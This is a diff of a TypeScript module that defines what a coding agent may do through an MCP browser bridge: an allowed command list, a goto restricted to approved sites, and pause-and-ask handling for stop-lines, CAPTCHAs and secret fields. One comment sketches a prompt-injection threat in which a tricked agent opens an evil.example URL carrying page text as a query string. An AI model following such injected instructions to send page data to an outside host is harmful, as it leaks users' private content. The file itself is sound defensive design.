@@ -1,16 +1,16 @@
 // The MCP bridge's rules: what may pass between a coding agent's MCP server, the host's pipe and the side panel.
 // Agent → host (pipe): {type: 'run', token, commands}. Host → panel: {type: 'run', commands}. Panel → host → agent: a BridgeReply.
-import { AI_COMMANDS, defuse } from './agent-prompt.ts';
+import { defuse } from './agent-prompt.ts';
 import { isObject, onlyKeys } from './host-request.ts';
 import { HandOver, StopLine } from './messages.ts';
 import { parseCommand } from './parse-command.ts';
 import type { Shot } from './screenshot.ts';
 import { checkTip } from './site-tips.ts';
 
-// What a coding agent may run: the AI's commands plus read (it gets no page list each turn), look (read with a
-// picture, on request only: images cost tokens) and tip (F10: suggest a site tip, you decide). No tab: it works only
-// in a goal run's own tabs. No search: its words could carry page text off the bridge's Sites.
-export const MCP_COMMANDS = [...AI_COMMANDS.filter((n) => n !== 'tab' && n !== 'search'), 'read', 'look', 'tip'];
+// What a coding agent may run, with read (it gets no page list each turn), look (read with a picture, on request only:
+// images cost tokens) and tip (F10: suggest a site tip, you decide). goto only to the bridge's Sites (checkGoto): a
+// tricked agent could otherwise open evil.example/?data=<page text>. No search: its words could carry page text off them.
+export const MCP_COMMANDS = ['text', 'find', 'pick', 'click', 'drag', 'hover', 'type', 'paste', 'select', 'scroll', 'key', 'goto', 'back', 'pause', 'repeat', 'read', 'look', 'tip'];
 export const LOOK_HELP = 'read, plus a screenshot of the tab with the same numbers drawn on. Costs image tokens: use it only when the text misses something visual (highlighted days, check-mark icons)';
 export const TIP_HELP = 'tip "one short sentence" — suggest a tip about the site you\'re on for later runs (where things are, what opens what). The user is asked to save it. Alone or last in a batch';
 // Characters in one run: one command line, or all of a batch's together. WR2: a paste carries a whole drawing (JSON);
@@ -135,7 +135,7 @@ export function isBridgeStart(text: string): boolean {
   return isObject(m) && m.type === 'bridge' && onlyKeys(m, ['type']);
 }
 
-// 4.2–4.3 for the bridge, like a goal run: a stop-line asks you, it doesn't refuse (plan.md: "pauses and asks"). Allow
+// 4.2–4.3 for the bridge: a stop-line asks you, it doesn't refuse (plan.md: "pauses and asks"). Allow
 // once (you.allow → true) runs the same command once more with allow. I'll do it, or a hand-over (a secret field, a
 // CAPTCHA: never Allow once, only ever yours), hands you the step: do it, press Resume (you.resume → true), and the
 // agent is told to go on with its task. Every other error passes through unasked.
@@ -155,7 +155,7 @@ export async function allowOnce(attempt: (allow: boolean) => Promise<string | vo
   return "The user did this step themselves, then pressed Resume. Don't redo it: read the page to see what it shows now, then go on with your task.";
 }
 
-// 4.2 for the bridge, as in a goal run: a CAPTCHA is yours. While one is shown, every command but goto and back (they
+// 4.2 for the bridge: a CAPTCHA is yours. While one is shown, every command but goto and back (they
 // leave the page, so they don't look) waits until you solve it and press Resume; then it doesn't run, as the page
 // changed under it. name '': after a command, so the page goto or back landed on is checked too. shown: the kind on
 // screen, '' none (captchaAll). solved: the seen of the one you last resumed from, since a solved CAPTCHA often stays on
